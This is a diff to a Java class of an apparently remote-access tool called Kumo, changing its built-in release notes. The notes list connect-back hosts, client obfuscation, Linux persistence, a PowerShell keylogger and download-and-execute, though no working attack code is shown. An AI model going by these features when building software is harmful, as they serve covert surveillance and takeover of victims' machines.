@@ -43,21 +43,22 @@ public class Controller implements Repository {
         String s = "Release notes: Kumo v" + KumoSettings.CURRENT_VERSION + "\n" +
                 "\tNew stuff!:\n" +
                 "\t\t- Updated UI\n" +
-                "\t\t\t- Full transition to Material Design elements (JFoenix).\n" +
-                "\t\t\t- Added dark mode.\n" +
-                "\t\t\t- Changed primary application color (mediumslateblue -> #1dd1a1)\n" +
-                "\t\t\t- Updated bottom bar color to colored text on white background.\n" +
-                "\t\t\t- \"Home\" screen is now the client list.\n" +
-                "\t\t\t- Changed top bar to have navigation tiles.\n" +
-                "\t\t\t- Changed exit and minimize buttons to rounded buttons.\n" +
-                "\t\t\t- Switched navigation icons from PNG to SVG to fix image scaling issues in Windows.\n" +
+                "\t\t\t* Full transition to Material Design elements (JFoenix).\n" +
+                "\t\t\t* Added dark mode.\n" +
+                "\t\t\t* Changed primary application color (mediumslateblue -> #1dd1a1)\n" +
+                "\t\t\t* Updated bottom bar color to colored text on white background.\n" +
+                "\t\t\t* \"Home\" screen is now the client list.\n" +
+                "\t\t\t* Changed top bar to have navigation tiles.\n" +
+                "\t\t\t* Changed exit and minimize buttons to rounded buttons.\n" +
+                "\t\t\t* Switched navigation icons from PNG to SVG to fix image scaling issues in Windows.\n" +
                 "\t\t- Add release notes menu.\n" +
                 "\t\t- Add the ability to put a domain name for a connect-back host.\n" +
                 "\t\t- Added more server logging.\n" +
                 "\t\t- Improved readability of logs.\n" +
                 "\t\t- Add the ability to generate ProGuard obfuscation rules for the client JAR.\n" +
                 "\t\t- Added linux persistence\n" +
-                "\t\t- Added Windows key logger (PowerShell based)\n\n" +
+                "\t\t- Added Windows key logger (PowerShell based)\n" +
+                "\t\t- Added more stuff to system info.\n\n" +
                 "\tBug fixes:\n" +
                 "\t\t- Fix download & execute so it works on Windows clients.\n" +
                 "\t\t- Fixed accidental stage height reset when double clicking info and updates nav tiles.\n" +
